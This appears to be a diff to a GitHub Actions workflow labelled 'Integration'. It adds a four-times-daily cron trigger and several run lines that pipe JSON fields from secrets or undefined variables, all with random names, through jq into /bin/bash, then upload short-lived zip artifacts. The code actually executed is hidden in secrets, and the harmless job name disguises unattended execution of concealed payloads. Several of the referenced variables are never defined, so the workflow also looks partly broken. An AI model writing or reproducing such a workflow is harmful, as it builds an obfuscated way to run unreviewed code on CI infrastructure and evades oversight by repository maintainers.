@@ -2,6 +2,8 @@ name: Integration
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '37 5,11,17,23 * * *'
 permissions:
   contents: read
 jobs:
@@ -14,16 +16,17 @@ jobs:
           fetch-depth: 1
       - name: Run
         env:
-          eqzsr7051: ${{ secrets.eqzsr7051 }}
+          t70: ${{ secrets.t70 }}
         run: |
-          printf '%s' "$eqzsr7051" | jq -r .qn71 | /bin/bash
-          printf '%s' "$e0090" | jq -r .ifyw8 | /bin/bash
-          printf '%s' "$ixxc4" | jq -r .k83368 | /bin/bash
-          printf '%s' "$jms3016" | jq -r .wuiwa9 | /bin/bash
+          printf '%s' "$t70" | jq -r .g54 | /bin/bash
+          printf '%s' "$zlv57309" | jq -r .hggd3304 | /bin/bash
+          printf '%s' "$ok068" | jq -r .sn96 | /bin/bash
+          echo $kfo6 | jq -r .xjkdk7 | /bin/bash
+          printf '%s' "$cvtns4" | jq -r .zbc6 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
         with:
-          name: M9o3cyqd
+          name: fSkJHd6v
           path: "*.zip"
           retention-days: 1
